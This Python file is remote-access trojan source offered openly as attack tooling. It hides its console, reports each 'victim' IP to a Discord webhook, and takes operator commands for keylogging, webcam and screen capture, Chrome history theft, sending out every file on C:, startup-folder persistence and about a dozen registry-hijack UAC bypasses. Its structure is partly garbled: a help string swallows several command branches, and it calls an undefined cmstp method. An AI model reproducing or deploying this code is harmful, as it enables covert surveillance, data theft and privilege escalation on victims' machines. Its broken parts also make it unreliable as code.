import socket
import subprocess
import os
import pyautogui
import cv2
import shlex
import shutil
from pynput.keyboard import Key, Listener
import psutil
import platform
import time
import webbrowser
import urllib.request
import requests
import sys
import ctypes
import winreg
import tempfile

# Hide console window (Windows only)
if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class RemoteShell:
    def __init__(self, port=4444):
        self.PORT = port
        self.keystrokes = []
        self.command_history = []

    def send_ip_to_webhook(self, ip):
        webhook_url = "YOUR_DISCORD_WEBHOOK_URL"  # Replace with your webhook
        try:
            data = {"content": f"🚨 **New Victim Connected!**\nIP: `{ip}`\nPort: `{self.PORT}`"}
            requests.post(webhook_url, json=data, timeout=5)
        except:
            pass  # Silently fail if no internet

    def execute_command(self, command):
        try:
            command = shlex.quote(command)
            output = subprocess.getoutput(command)
            return output
        except Exception as e:
            return str(e)

    def upload_file(self, filename, connection):
        try:
            with open(filename, 'rb') as file:
                data = file.read()
            connection.sendall(b'BEGIN_UPLOAD')
            connection.sendall(data)
            connection.sendall(b'END_UPLOAD')
            return f"File uploaded successfully\n"
        except Exception as e:
            return f"Failed to upload file: {e}\n"

    def save_screenshot(self, data):
        filename = 'remote_screenshot.png'
        with open(filename, 'wb') as file:
            file.write(data)
        return f"Screenshot saved successfully\n"

    def remote_desktop(self):
        screenshot = pyautogui.screenshot()
        screenshot.save('remote_desktop.png')
        with open('remote_desktop.png', 'rb') as file:
            data = file.read()
        return data

    def get_system_info(self):
        system_info = f"System: {platform.system()} {platform.release()}\n"
        system_info += f"Node Name: {platform.node()}\n"
        system_info += f"Processor: {platform.processor()}\n"
        system_info += f"Machine: {platform.machine()}\n"
        system_info += f"Python Version: {platform.python_version()}\n"
        system_info += f"Total Memory: {psutil.virtual_memory().total / (1024 * 1024)} MB\n"
        system_info += f"Available Memory: {psutil.virtual_memory().available / (1024 * 1024)} MB\n"
        system_info += f"Total Disk Space: {psutil.disk_usage('/').total / (1024 * 1024 * 1024)} GB\n"
        system_info += f"Free Disk Space: {psutil.disk_usage('/').free / (1024 * 1024 * 1024)} GB\n"
        return system_info

    def download_file(self, url, filename):
        try:
            urllib.request.urlretrieve(url, filename)
            return f"File downloaded successfully\n"
        except Exception as e:
            return f"Failed to download file: {e}\n"

    def process_management(self, action, process_name):
        try:
            if action == 'list':
                return subprocess.getoutput('tasklist')
            elif action == 'kill':
                subprocess.run(['taskkill', '/F', '/IM', process_name], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                return f"Process terminated successfully\n"
        except subprocess.CalledProcessError:
            return f"Failed to execute process management action\n"

    def automated_reconnaissance(self):
        try:
            return subprocess.getoutput('systeminfo')
        except Exception as e:
            return f"Failed to perform automated reconnaissance: {e}\n"

    def dynamic_payload_delivery(self, url):
        try:
            subprocess.run(['powershell', '-c', f'(new-object System.Net.WebClient).DownloadFile("{url}", "payload.exe")'], creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.Popen(['payload.exe'], creationflags=subprocess.CREATE_NO_WINDOW)
            return "Payload executed successfully\n"
        except Exception as e:
            return f"Failed to execute payload: {e}\n"

    def get_browsing_history(self):
        try:
            history_info = subprocess.getoutput('sqlite3 "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" "SELECT * FROM urls"')
            return history_info
        except Exception as e:
            return f"Failed to retrieve browsing history: {e}\n"

    def on_press(self, key):
        self.keystrokes.append(key)

    def install_requirements(self):
        try:
            subprocess.run(['pip', 'install', 'colorama', 'pyautogui', 'psutil', 'pynput', 'opencv-python'], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return "Dependencies installed successfully\n"
        except subprocess.CalledProcessError:
            return "Failed to install dependencies\n"

    # UAC Bypass Methods
    def bypass_uac_runas(self, payload):
        try:
            subprocess.run(f'runas /user:Administrator "{payload}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using runas initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def bypass_uac_fodhelper(self, payload):
        try:
            reg_path = r"Software\Classes\ms-settings\shell\open\command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            subprocess.Popen(["fodhelper.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using fodhelper initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def bypass_uac_slui(self, payload):
        try:
            reg_path = r"Software\Classes\exefile\shell\runas\command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
                winreg.SetValueEx(key, "IsolatedCommand", 0, winreg.REG_SZ, payload)
            subprocess.Popen(["slui.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using slui initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def bypass_uac_silentcleanup(self, payload):
        try:
            reg_path = r"Environment"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "windir", 0, winreg.REG_SZ, payload)
            subprocess.Popen(["schtasks", "/run", "/tn", "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup"], creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using SilentCleanup initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def bypass_uac_sdclt(self, payload):
        try:
            reg_path = r"Software\Classes\Folder\shell\open\command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            subprocess.Popen(["sdclt.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using sdclt initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def bypass_uac_perfmon(self, payload):
        try:
            reg_path = r"Environment"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "windir", 0, winreg.REG_SZ, payload)
            subprocess.Popen(["perfmon.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using perfmon initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def bypass_uac_eventvwr(self, payload):
        try:
            reg_path = r"Software\Classes\mscfile\shell\open\command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
            subprocess.Popen(["eventvwr.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using eventvwr initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def bypass_uac_compmgmtlauncher(self, payload):
        try:
            reg_path = r"Software\Classes\compmgmt\shell\open\command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
            subprocess.Popen(["compmgmtlauncher.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using compmgmtlauncher initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def bypass_uac_computerdefaults(self, payload):
        try:
            reg_path = r"Software\Classes\ms-settings\shell\open\command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
            subprocess.Popen(["computerdefaults.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using computerdefaults initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def bypass_uac_token_manipulation(self, payload):
        try:
            subprocess.Popen(["powershell", "-command", f"Start-Process '{payload}' -Verb RunAs"], creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using token manipulation initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def bypass_uac_wsreset(self, payload):
        try:
            reg_path = r"Software\Classes\AppX82a6g4n8b6qtx83q60v264zq8hx8b7t6\Shell\Open\Command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            subprocess.Popen(["wsreset.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using wsreset initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def bypass_uac_slui_changepk(self, payload):
        try:
            reg_path = r"Software\Classes\exefile\shell\runas\command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
            subprocess.Popen(["slui.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.Popen(["changepk.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
            return "UAC bypass using slui and changepk initiated.\n"
        except Exception as e:
            return f"UAC bypass failed: {e}\n"

    def main(self):
        print("Connecting back to the host machine...")
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', self.PORT))
        server.listen(1)
        connection, address = server.accept()
        victim_ip = address[0]
        self.send_ip_to_webhook(victim_ip)
        with connection:
            install_status = self.install_requirements()
            connection.send(install_status.encode())
            hostname = socket.gethostname()
            connection.send(f"Machine name: {hostname}\n".encode())
            connection.send(f"Current directory: {os.getcwd()}\n".encode())
            with Listener(on_press=self.on_press) as listener:
                while True:
                    try:
                        command = connection.recv(1024).decode()
                        if command.strip().lower() == 'exit':
                            break
                        elif command.strip().lower() == 'cwd':
                            connection.send(f"Current directory: {os.getcwd()}\n".encode())
                        elif command.startswith('cd '):
                            directory = command.split(' ', 1)[1].strip()
                            try:
                                os.chdir(directory)
                                connection.send(f"Changed directory to: {os.getcwd()}\n".encode())
                            except FileNotFoundError:
                                connection.send(f"Directory not found: {directory}\n".encode())
                        elif command.startswith('upload '):
                            filename = command.split(' ', 1)[1].strip()
                            response = self.upload_file(filename, connection)
                            connection.send(response.encode())
                        elif command.strip().lower() == 'screenshot':
                            screenshot_data = self.remote_desktop()
                            connection.sendall(b'BEGIN_SCREENSHOT')
                            connection.sendall(screenshot_data)
                            connection.sendall(b'END_SCREENSHOT')
                            connection.send("Screenshot captured successfully\n".encode())
                        elif command.strip().lower() == 'keystrokes':
                            keystrokes_str = ''.join([str(key) for key in self.keystrokes])
                            connection.send(keystrokes_str.encode())
                        elif command.strip().lower() == 'network':
                            network_info = subprocess.getoutput('ipconfig /all')
                            connection.send(network_info.encode())

                        elif command.strip().lower() == 'privilege':
                            privilege_info = subprocess.getoutput('whoami /priv')
                            connection.send(privilege_info.encode())
                        elif command.strip().lower() == 'webcam':
                            try:
                                cap = cv2.VideoCapture(0)
                                ret, frame = cap.read()
                                cv2.imwrite('webcam_capture.jpg', frame)
                                cap.release()
                                with open('webcam_capture.jpg', 'rb') as file:
                                    data = file.read()
                                connection.sendall(b'BEGIN_WEBCAM_IMAGE')
                                connection.sendall(data)
                                connection.sendall(b'END_WEBCAM_IMAGE')
                                connection.send("Webcam photo captured and sent successfully\n".encode())
                            except Exception as e:
                                connection.send(f"Failed to capture webcam: {e}\n".encode())

                        elif command.strip().lower() == 'remote':
                            screenshot_data = self.remote_desktop()
                            connection.sendall(b'BEGIN_REMOTE_DESKTOP')
                            connection.sendall(screenshot_data)
                            connection.sendall(b'END_REMOTE_DESKTOP')
                            connection.send("Remote desktop screenshot captured successfully\n".encode())
                        elif command.strip().lower() == 'processes':
                            process_info = subprocess.getoutput('tasklist')
                            connection.send(process_info.encode())
                        elif command.strip().lower().startswith('kill '):
                            process_name = command.split(' ', 1)[1].strip()
                            try:
                                subprocess.run(['taskkill', '/F', '/IM', process_name], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                connection.send(f"Process terminated successfully\n".encode())
                            except subprocess.CalledProcessError:
                                connection.send(f"Failed to terminate process\n".encode())
                        elif command.strip().lower().startswith('create_file '):
                            file_name = command.split(' ', 1)[1].strip()
                            try:
                                with open(file_name, 'w') as new_file:
                                    new_file.write("")
                                connection.send(f"File created successfully\n".encode())
                            except Exception as e:
                                connection.send(f"Failed to create file: {e}\n".encode())
                        elif command.strip().lower().startswith('delete '):
                            target = command.split(' ', 1)[1].strip()
                            try:
                                os.remove(target)
                                connection.send(f"Deleted: {target}\n".encode())
                            except Exception as e:
                                connection.send(f"Failed to delete: {e}\n".encode())
                        elif command.strip().lower() == 'data_exfiltration':
                            for root, dirs, files in os.walk("C:\\"):
                                for file in files:
                                    try:
                                        file_path = os.path.join(root, file)
                                        with open(file_path, 'rb') as f:
                                            data = f.read()
                                        connection.sendall(b'BEGIN_DATA_EXFILTRATION')
                                        connection.sendall(data)
                                        connection.sendall(b'END_DATA_EXFILTRATION')
                                        connection.send(f"File exfiltrated successfully\n".encode())
                                    except Exception as e:
                                        connection.send(f"Failed to exfiltrate file: {e}\n".encode())
                        elif command.strip().lower() == 'persistence':
                            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                            script_path = os.path.abspath(__file__)
                            with open(os.path.join(startup_path, 'update_service.bat'), 'w') as f:
                                f.write(f'@echo off\npythonw "{script_path}"\n')
                            connection.send("Persistence established successfully\n".encode())
                        elif command.strip().lower() == 'stealth':
                            try:
                                subprocess.Popen(['attrib', '+h', os.path.abspath(__file__)], creationflags=subprocess.CREATE_NO_WINDOW)
                                connection.send("Stealth mode activated successfully\n".encode())
                            except Exception as e:
                                connection.send(f"Failed to activate stealth mode: {e}\n".encode())
                        elif command.strip().lower().startswith('bypass_uac '):
                            uac_id = command.split(' ')[1]
                            payload = command.split(' ', 2)[2] if len(command.split(' ')) > 2 else "cmd.exe"
                            if uac_id == "1":
                                response = self.bypass_uac_runas(payload)
                            elif uac_id == "2":
                                response = self.bypass_uac_fodhelper(payload)
                            elif uac_id == "3":
                                response = self.bypass_uac_slui(payload)
                            elif uac_id == "4":
                                response = self.bypass_uac_silentcleanup(payload)
                            elif uac_id == "5":
                                response = self.bypass_uac_sdclt(payload)
                            elif uac_id == "6":
                                response = self.bypass_uac_sdclt(payload)
                            elif uac_id == "7":
                                response = self.bypass_uac_perfmon(payload)
                            elif uac_id == "8":
                                response = self.bypass_uac_eventvwr(payload)
                            elif uac_id == "9":
                                response = self.bypass_uac_compmgmtlauncher(payload)
                            elif uac_id == "10":
                                response = self.bypass_uac_computerdefaults(payload)
                            elif uac_id == "11":
                                response = self.bypass_uac_token_manipulation(payload)
                            elif uac_id == "13":
                                response = self.bypass_uac_cmstp(payload)
                            elif uac_id == "14":
                                response = self.bypass_uac_wsreset(payload)
                            elif uac_id == "15":
                                response = self.bypass_uac_slui_changepk(payload)
                            else:
                                response = "Invalid UAC bypass ID.\n"
                            connection.send(response.encode())
                        elif command.strip().lower() == 'browser_history':
                            history_info = subprocess.getoutput('sqlite3 "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" "SELECT * FROM urls"')
                            connection.send(history_info.encode())
                        elif command.strip().lower() == 'explorer':
                            os.startfile(os.getcwd())
                            connection.send("Windows Explorer opened successfully\n".encode())
                        elif command.strip().lower() == 'help':
                            help_text = """
                        elif command.strip().lower() == 'system_info':
                            connection.send(self.get_system_info().encode())
                        elif command.strip().lower().startswith('download '):
                            url = command.split(' ', 1)[1].strip()
                            filename = os.path.basename(url)
                            response = self.download_file(url, filename)
                            connection.send(response.encode())
                        elif command.strip().lower() == 'registry':
                            try:
                                registry_info = subprocess.getoutput('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')
                                connection.send(registry_info.encode())
                            except Exception as e:
                                connection.send(f"Failed to get registry info: {e}\n".encode())



Available commands:
1. cwd - Display current directory
2. cd [directory] - Change directory
3. upload [filename] - Upload file
4. screenshot - Capture screenshot
5. keystrokes - Display captured keystrokes
6. network - Get network information
7. registry - Get registry information
8. privilege - Get privilege information
9. webcam - Capture photo from webcam
10. remote - Capture remote desktop screenshot
11. processes - List running processes
12. kill [process_name] - Kill a process by name
13. create_file [filename] - Create a new file
14. delete [filename] - Delete a file
15. data_exfiltration - Exfiltrate data
16. persistence - Establish persistence
17. stealth - Activate stealth mode
18. bypass_uac [id] [payload] - Bypass UAC using specified method
   IDs: 1 (runas), 2 (fodhelper), 3 (slui), 4 (silentcleanup), 5 (sdclt), 6 (sdclt App Paths),
   7 (perfmon), 8 (eventvwr), 9 (compmgmtlauncher), 10 (computerdefaults),
   11 (token manipulation), 13 (cmstp), 14 (wsreset), 15 (slui+changepk)
19. explorer - Open Windows Explorer
20. browser_history - Get browsing history
21. exit - Close the connection
                            """
                            connection.send(help_text.encode())
                        elif command.strip().lower() == 'cls':
                            pass
                        elif command.strip().lower() == 'ls':
                            file_list = os.listdir()
                            directory_list = [f"{item}/" if os.path.isdir(item) else item for item in file_list]
                            file_list_str = "\n".join(directory_list)
                            connection.send(file_list_str.encode())
                        else:
                            output = self.execute_command(command)
                            connection.send(output.encode())
                    except Exception as e:
                        connection.send(f"Error: {e}\n".encode())

if __name__ == "__main__":
    remote_shell = RemoteShell()
    remote_shell.main()
